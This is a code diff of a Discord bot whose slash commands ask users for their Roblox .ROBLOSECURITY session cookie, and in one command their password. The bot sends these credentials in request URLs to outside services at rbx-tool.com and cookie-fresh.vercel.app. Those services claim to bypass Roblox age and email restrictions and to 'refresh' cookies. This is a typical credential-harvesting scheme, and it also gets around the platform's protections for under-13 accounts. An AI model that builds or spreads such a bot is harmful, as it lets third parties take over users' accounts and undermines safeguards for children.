@@ -1,16 +1,22 @@
-const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
+const {
+  Client,
+  GatewayIntentBits,
+  REST,
+  Routes,
+  SlashCommandBuilder,
+  EmbedBuilder,
+} = require('discord.js');
 require('dotenv').config();
 const fetch = require('node-fetch');
 
 const client = new Client({
-  intents: [GatewayIntentBits.Guilds]
+  intents: [GatewayIntentBits.Guilds],
 });
 
 client.once('ready', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
 });
 
-// Register slash commands
 client.on('ready', async () => {
   const commands = [
     new SlashCommandBuilder()
@@ -36,10 +42,10 @@ client.on('ready', async () => {
       ),
     new SlashCommandBuilder()
       .setName('refreshcookie')
-      .setDescription('Refresh your Roblox cookie')
+      .setDescription('Refresh your .ROBLOSECURITY cookie')
       .addStringOption(option =>
         option.setName('cookie')
-          .setDescription('Your old .ROBLOSECURITY cookie')
+          .setDescription('Your current .ROBLOSECURITY cookie')
           .setRequired(true)
       )
   ].map(cmd => cmd.toJSON());
@@ -56,7 +62,6 @@ client.on('ready', async () => {
   }
 });
 
-// Handle slash commands
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand()) return;
 
@@ -68,25 +73,21 @@ client.on('interactionCreate', async interaction => {
     });
   }
 
-  const { commandName } = interaction;
-
-  if (commandName === 'bypass2008') {
+  if (interaction.commandName === 'bypass2008') {
     const cookie = interaction.options.getString('cookie');
+
     await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });
 
     try {
-      const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`, {
-        headers: {
-          'User-Agent': 'Mozilla/5.0',
-          'Accept': 'application/json'
-        }
-      });
+      const res = await fetch(`https://rbx-tool.com/apis/bypassAge?a=${encodeURIComponent(cookie)}`);
       const data = await res.json();
 
       const embed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
         .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
-        .setDescription(data.message || "Unknown response");
+        .setDescription(data.message || (data.status === "success"
+          ? "Success removing email!"
+          : "Unknown error"));
 
       await interaction.followUp({ embeds: [embed] });
     } catch {
@@ -98,24 +99,22 @@ client.on('interactionCreate', async interaction => {
     }
   }
 
-  if (commandName === 'bypass13plus') {
+  if (interaction.commandName === 'bypass13plus') {
     const cookie = interaction.options.getString('cookie');
     const password = interaction.options.getString('password');
+
     await interaction.reply({ content: '✅ Command Successfully', ephemeral: true });
 
     try {
-      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`, {
-        headers: {
-          'User-Agent': 'Mozilla/5.0',
-          'Accept': 'application/json'
-        }
-      });
+      const res = await fetch(`https://rbx-tool.com/apis/bypassAgeV2?a=${encodeURIComponent(cookie)}&b=${encodeURIComponent(password)}`);
       const data = await res.json();
 
       const embed = new EmbedBuilder()
         .setColor(data.status === "success" ? 0x22c55e : 0xef4444)
         .setTitle(data.status === "success" ? "✅ Success" : "❌ Failed")
-        .setDescription(data.message || "Unknown response");
+        .setDescription(data.message || (data.status === "success"
+          ? "Success converting 13+ to under 13!"
+          : "Unknown error"));
 
       await interaction.followUp({ embeds: [embed] });
     } catch {
@@ -127,46 +126,46 @@ client.on('interactionCreate', async interaction => {
     }
   }
 
-  if (commandName === 'refreshcookie') {
+  if (interaction.commandName === 'refreshcookie') {
     const cookie = interaction.options.getString('cookie');
+
     await interaction.reply({ content: '🔄 Refreshing your cookie...', ephemeral: true });
 
     try {
-      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`, {
-        headers: {
-          'User-Agent': 'Mozilla/5.0',
-          'Accept': 'application/json'
-        }
-      });
+      const res = await fetch(`https://cookie-fresh.vercel.app/api/refresh?cookie=${encodeURIComponent(cookie)}`);
       const data = await res.json();
 
-      const statusEmbed = new EmbedBuilder()
-        .setColor(data.success ? 0x22c55e : 0xef4444)
-        .setTitle(data.success ? "✅ Cookie Refreshed" : "❌ Refresh Failed")
-        .setDescription(data.success ? "Your Roblox cookie was refreshed successfully." : "Unable to refresh your cookie.");
-
-      // Public status
-      await interaction.followUp({ embeds: [statusEmbed] });
-
-      // Private refreshed cookie
-      if (data.success && data.refreshedCookie) {
-        await interaction.user.send({
-          embeds: [
-            new EmbedBuilder()
-              .setColor(0x60a5fa)
-              .setTitle("🔐 Refreshed Cookie")
-              .setDescription(`\`\`\`${data.refreshedCookie}\`\`\``)
-              .setFooter({ text: "This message is only visible to you." })
-          ]
-        }).catch(() => {
-          interaction.followUp({ content: '⚠️ Failed to send DM with cookie. Please enable DMs.', ephemeral: true });
-        });
+      if (!data.redemptionResult || !data.redemptionResult.success) {
+        const errorEmbed = new EmbedBuilder()
+          .setColor(0xef4444)
+          .setTitle("❌ Unable to refresh your cookie.")
+          .setDescription("Roblox might have rejected the cookie or the backend failed.");
+        return interaction.followUp({ embeds: [errorEmbed] });
       }
-    } catch {
+
+      const refreshed = data.redemptionResult.refreshedCookie;
+
+      const publicEmbed = new EmbedBuilder()
+        .setColor(0x22c55e)
+        .setTitle("✅ Successfully refreshed cookie!");
+
+      await interaction.followUp({ embeds: [publicEmbed] }); // public message
+
+      const privateEmbed = new EmbedBuilder()
+        .setColor(0x0ea5e9)
+        .setTitle("🔐 Your New .ROBLOSECURITY Cookie")
+        .setDescription(`\`\`\`${refreshed}\`\`\``);
+
+      await interaction.followUp({
+        embeds: [privateEmbed],
+        ephemeral: true // only the user sees this
+      });
+
+    } catch (err) {
       const embed = new EmbedBuilder()
         .setColor(0xfacc15)
         .setTitle("🚫 Request Failed")
-        .setDescription("Request blocked or failed to fetch data.");
+        .setDescription("Failed to connect to refresh API or bad response.");
       await interaction.followUp({ embeds: [embed] });
     }
   }
